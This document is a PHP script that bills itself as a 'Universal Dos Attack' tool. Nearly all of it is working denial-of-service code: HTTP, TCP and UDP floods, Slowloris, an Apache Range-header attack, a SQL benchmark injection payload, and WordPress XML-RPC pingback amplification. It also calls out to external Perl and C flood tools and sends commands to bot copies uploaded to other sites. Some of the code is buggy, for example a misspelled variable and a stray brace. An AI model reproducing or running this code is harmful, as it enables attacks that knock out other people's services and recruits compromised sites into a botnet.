<?php
error_reporting(0);
echo "

########################
#                      #
# Universal Dos Attack #
#  coded by def_M0use  #
#  Copyright (c) 2017  #
########################

";

echo "To strengthen the attack, specify the address of the script\n";
echo "example: -myhost http://localhost/dos.php -shost 1.2.3.4 -stype slowloris -stime 100\n";
echo "Upload the bot to the site with a wide channel and send the command to start the attack\n";
echo "example: -bot http://site.com -stype tcp -shost 1.2.3.4 -stime 100\n\n";
echo "-shost <target> -stime <time> -stype <type>\n";
echo "example: -shost 1.2.3.4 -stime 100 -stype udp\n";
echo "usage xerxes: -stype xerxes -shost <target> -port <port>\n";
echo "usage ldap: -stype ldap -server <server> -target <target> -port <port>\n";
echo "usage icmp: -stype icmp -shost <target> -port <port> -size <size> -time <time>\n";
echo "usage dominate: -stype dominate -shost <target> -threads <threads> -limit <limit> -time <time>\n";
echo "usage xmlrpc: -stype xmlrpc -server <server> -shost <target> -site>\n";
echo "1) HTTP GET-POST-HEAD ";  echo "2) TCP ";  echo "3) refref ";  echo "4) apachekill ";  echo "5) dominate ";  echo "6) UDP "; 
echo "7) Slowloris "; echo "8) perl icmp ";  echo "9) perl ldap "; echo "10) xerxes tool "; echo "11) xmlrpc ";

for ($i = 1; $i <= 11; $i++){
    if('-shost'==$argv[$i]){
        $j=$i+1;
        $ip = $argv[$j];
    }
    if('-stime' == $argv[$i]){
        $j=$i+1;
        $time = $argv[$j];
    }
    if('-sbot' == $argv[$i]){
        $j=$i+1;
        $sbot = $argv[$j];
    }
    if('-stype' == $argv[$i]){
        $j=$i+1;
        $type = $argv[$j];
    }
    if('-mthd' == $argv[$i]){
        $j=$i+1;
        $mthd = $argv[$j];
    }
    if('-mthd1' == $argv[$i]){
        $j=$i+1;
        $mthd1 = $argv[$j];
    }
    if('-num' == $argv[$i]){
        $j=$i+1;
        $num = $argv[$j];
    }
    if('-server' == $argv[$i]){
        $j=$i+1;
        $server = $argv[$j];
    }
    if('-target' == $argv[$i]){
        $j=$i+1;
        $target = $argv[$j];
    }
    if('-port' == $argv[$i]){
        $j=$i+1;
        $port = $argv[$j];        
    }
    if('-bot' == $argv[$i]){
        $j=$i+1;
        $bot = $argv[$j];        
    }
    if('-threads' == $argv[$i]){
        $j=$i+1;
        $threads = $argv[$j];        
    }
    if('-limit' == $argv[$i]){
        $j=$i+1;
        $limit = $argv[$j];        
    }
    if('-myhost' == $argv[$i]){
        $j=$i+1;
        $myhost = $argv[$j];        
    }
    if('-site' == $argv[$i]){
        $j=$i+1;
        $site = $argv[$j];        
    }

}


if($type == 'http'){
    $timei = time();
    $req =  array('POST','GET','HEAD');
    $brow = array("", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2", "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.10.289 Version/12.00", "Opera/9.21 (Windows NT 5.1; U; en)", "Opera/9.80 (Windows NT 5.1; U; Distribution 00; ru) Presto/2.10.289 Version/12.00");
    $rand_keys = array_rand($brow, 2);
    while ((time() - $timei < $time)) {
        foreach ($req as $mthd) {
            $ch = @curl_init();
            @curl_setopt($ch, CURLOPT_URL,  $myhost."?ip=$ip&time=$time");
            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
            @curl_setopt($ch, CURLOPT_HEADER, 0);
            @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            @curl_exec($ch);
            $fs      = array();
            $request =  "$mhtd / HTTP/1.1\r\n";
            $request .= "Host: $ip\r\n";
            $request .= "User-Agent: ".$brow[$rand_keys[1]]."\r\n";
            $request .= "Keep-Alive: 900\r\n";
            $request .= "Accept: *.*\r\n";
            for ($i = 0; $i < 100; $i++) {
                $fs[$i] = @fsockopen($ip, 80, $errno, $errstr);
            }
            for ($i = 0; $i < 100; $i++) {
                if (@fwrite($fs[$i], $request)) {
                    continue;
                } else {
                    $fs[$i] = @fsockopen($ip, 80, $errno, $errstr);
                }
            }   
        }
    }
}

if($type == 'tcp'){
    $port = 80;
    $timei = time();
    $out = str_repeat("A", $size);
    while (time() - $timei < $time) {
        $ch = @curl_init();
        @curl_setopt($ch, CURLOPT_URL,  $myhost."?ip=$ip&time=$time");
        @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        @curl_setopt($ch, CURLOPT_HEADER, 0);
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
        @curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        @curl_exec($ch);
        $fp = stream_socket_client("tcp://$ip:$port", $errno, $errstr, 30);
        if ($fp)
        {
            stream_socket_sendto($fp, 'f*ck',STREAM_CLIENT_ASYNC_CONNECT);
            @fclose($socket);
        }
    }
}

if($type == 'refref')
{
    if( $curl = curl_init() ) {
        curl_setopt($curl, CURLOPT_URL, $ip." and(select+benchmark(99999999999,0x70726f62616e646f70726f62616e646f70726f62616e646f))");
        curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
        $out = curl_exec($curl);
        curl_close($curl);
    }
}

if($curl = curl_init()) { // bot command
    curl_setopt($curl, CURLOPT_URL, '$bot?$type&ip=$ip&$time=$time');
    curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
    curl_exec($curl);
    curl_close($curl);
  }

if($type == 'slowloris')
{
    $timei = time();
    $brow = array("", "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 YaBrowser/17.6.1.749 Yowser/2.5 Safari/537.36", " Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", "Opera/9.21 (Windows NT 5.1; U; en)", "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0");
    $rand_keys = array_rand($brow, 2);
    $i = 0;
    for ($i = 0; $i < 100; $i++) {
        $fs[$i] = @fsockopen($ip, 80, $errno, $errstr);
    }
    while ((time() - $timei < $time)) {
         $ch = @curl_init();
         @curl_setopt($ch, CURLOPT_URL,  $myhost."?ip=$ip&time=$time");
         @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
         @curl_setopt($ch, CURLOPT_HEADER, 0);
         @curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
         @curl_setopt($ch, CURLOPT_TIMEOUT, 5);
         @curl_exec($ch);
         for ($i = 0; $i < 100; $i++) {
            $out =  "GET / HTTP/1.1\r\n";
            $out .= "Host: {$ip}\r\n";
            $out .= "User-Agent: ".$brow[$rand_keys[1]]."\r\n";
            $out .= "Content-Length: " . rand(1, 1000) . "\r\n";
            $out .= "X-a: " . rand(1, 10000) . "\r\n";
            if (@fwrite($fs[$i], $out)) {
                continue;
            } else {

                $fs[$i] = @fsockopen($ip, 80, $errno, $errstr);
            }
        }
    }
}


if($type == 'udp'){
    $pack = 0;
    $timei = time();
    $max = $timei+$time;
    for($i = 06555; $i < 6555; $i++) {
        $mess .='x';
    }
    while (1) {
        $pack++;
        if(time() > $max){
            break;
        }
        $port = 53;
        $fp = fsockopen('udp://'.$ip,$port,$errno,$errstr,5);
        if($fp){
            fwrite($fp, $mess);
            fclose($fp);
        }
    }
}

if($type == 'apachekill'){
    $p = "";
    $port = 80;
    for ($k=0;$k<1300;$k++) {
        $p .= ",5-$k";
    }
    for ($k=0;$k<$num;$k++) {
        $p = "HEAD / HTTP/1.1\r\nHost: $ip\r\nRange:bytes=0-$p\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n";    
        $f = fsockopen($ip, 80, $errno, $errstr);
        fwrite($f, $p);
        }
    }
}

// perl
if($type == 'icmp'){
    exec('perl icmp.pl $ip $port $size $time');
}

if($type == 'ldap'){
    exec('perl ldap.pl $server $target $port');
}
//

// .c
if($type == 'xerxes'){
    exec('gcc xerxes.c -o xerxes');
    exec('./xerxes $ip $port');
}

if($type == 'dominate'){
    exec('gcc dominate.c -o dominate');
    exec('./dominate $ip $threads $limit $time');
}
//

if($type == 'xmlrpc'){
    $timei = time();
    while ((time() - $timei < $time)) {
        exec("curl -D -  $server -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>$target</string></value></param><param><value><string>$site</string></value></param></params></methodCall>'");
    }
}

?>
